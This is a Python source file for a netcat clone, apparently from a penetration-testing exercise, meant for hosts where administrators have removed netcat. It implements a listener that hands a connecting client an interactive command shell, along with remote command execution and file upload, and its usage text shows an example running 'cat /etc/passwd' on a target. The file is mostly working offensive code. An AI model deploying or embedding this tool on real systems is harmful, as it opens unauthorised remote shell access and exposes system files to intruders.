"""
Netcat is a versatile networking tool that allows read and write operations across the network.
Most administrators remove if form their systems for this reason, but there will always be a python installation
This is a simple network client and server that you can use to push files or a listener that gives you command line access.
"""

import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading

# recieve command,run it and returns the output as a string
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()

# Initialize NetCat object with args from the command line
class NetCat:
    def __init__ (self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()
    def send(self):
        # connect to the target, and if we have a buffer, we send that first
        self.socket.connect((self.args.target, self.args.port))
        if self.buffer:
            self.socket.send(self.buffer)
        try:
            # recieve data from the target
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())
        # (CTRL -C) will close the socket
        except KeyboardInterrupt:
            print('User terminated.')
            self.socket.close()
            sys.exit()
    
    # when the program runs as listener
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
    
    # method to execute corresponding task
    def handle(self, client_socket):
        # executing a command
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        # upload file
        elif self.args.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())
        
        # starting a shell
        elif self.args.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'KK: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                        cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

if __name__ == '__main__':
    parser = argparse.ArgumentParser( # creating a command line interface, we'll provide args
        description='Karani Net tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        # example usage
        epilog=textwrap.dedent( '''Example: 
            clone_netcat.py -t 192.168.1.100 -p 5555 -l -c # command shell
            clone_netcat.py -t 192.168.1.100 -p 5555 -u=myfile.txt # upload to file
            clone_netcat.py -t 192.168.1.100 -p 5555 -e="cat /etc/passwd" # execute command
            echo 'ABC' | clone_netcat.py -t 192.168.1.100 -p 135 # echo tect to server port 135
            clone_netcat.py -t 192.168.1.100 -p 5555 # connect to server
        ''')
    )
    # arguments that specify how the program behaves
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default="10.0.2.15", help='specified target')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args,buffer.encode())
    nc.run()
    
